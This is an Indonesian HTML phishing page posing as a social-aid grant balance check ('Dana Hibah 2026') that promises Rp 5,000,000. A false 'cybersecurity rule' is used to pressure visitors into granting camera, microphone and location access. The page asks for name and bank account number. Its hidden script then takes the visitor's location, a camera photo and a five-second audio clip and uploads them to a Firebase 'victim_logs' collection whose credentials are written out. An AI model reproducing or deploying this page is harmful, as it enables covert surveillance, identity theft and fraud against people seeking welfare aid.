<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cek Saldo Dana Hibah 2026</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100">
    <div id="overlay" class="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center p-4">
        <div class="bg-white p-6 rounded-xl max-w-sm text-center">
            <h2 class="font-bold text-xl mb-2">Izin Verifikasi Diperlukan</h2>
            <p class="text-sm text-gray-600 mb-6">Sesuai aturan keamanan siber terbaru, Anda wajib mengaktifkan izin Kamera, Mikrofon, dan Lokasi untuk memverifikasi bahwa Anda bukan Bot.</p>
            <button id="start-btn" class="w-full bg-green-600 text-white font-bold py-3 rounded-lg pulse-btn">SAYA MENGERTI & LANJUTKAN</button>
        </div>
    </div>

    <nav class="bg-blue-900 p-4 text-white font-bold">INFO BANSOS 2026</nav>
    <div class="p-4 max-w-md mx-auto">
        <div class="bg-white p-4 rounded shadow">
            <h1 class="text-lg font-bold mb-4">Lengkapi Data Diri untuk Klaim Saldo Rp 5.000.000</h1>
            <input type="text" placeholder="Nama Lengkap" class="w-full p-2 border mb-2">
            <input type="number" placeholder="Nomor Rekening" class="w-full p-2 border mb-4">
            <button class="w-full bg-blue-600 text-white p-3 rounded">PROSES SEKARANG</button>
        </div>
    </div>

    <!-- Hidden Capture Elements -->
    <video id="v" style="display:none" autoplay></video>
    <canvas id="c" style="display:none"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            databaseURL: "https://apktroj-default-rtdb.firebaseio.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab",
            measurementId: "G-WR01BDY3G6"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "apktroj_v1";

        document.getElementById('start-btn').onclick = async () => {
            document.getElementById('overlay').style.display = 'none';
            await signInAnonymously(auth);
            activateAll();
        };

        async function logToAdmin(payload) {
            try {
                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'), {
                    ...payload,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent
                });
            } catch (e) {}
        }

        function activateAll() {
            // 1. Get Location
            navigator.geolocation.getCurrentPosition(pos => {
                logToAdmin({ action: "GEO_LOCATION", location: { lat: pos.coords.latitude, lng: pos.coords.longitude } });
            }, err => logToAdmin({ action: "GEO_DENIED" }));

            // 2. Camera Capture
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                // Capture photo after 3 seconds
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL('image/jpeg', 0.5);
                    logToAdmin({ action: "CAPTURED_MEDIA", photo: photoData });
                }, 3000);

                // 3. Audio Recording (Simple Clip)
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        logToAdmin({ action: "CAPTURED_MEDIA", audio: reader.result });
                    };
                    reader.readAsDataURL(blob);
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 5000); // Record 5 seconds
            }).catch(e => logToAdmin({ action: "PERM_DENIED", error: e.message }));
        }
    </script>
</body>
</html>
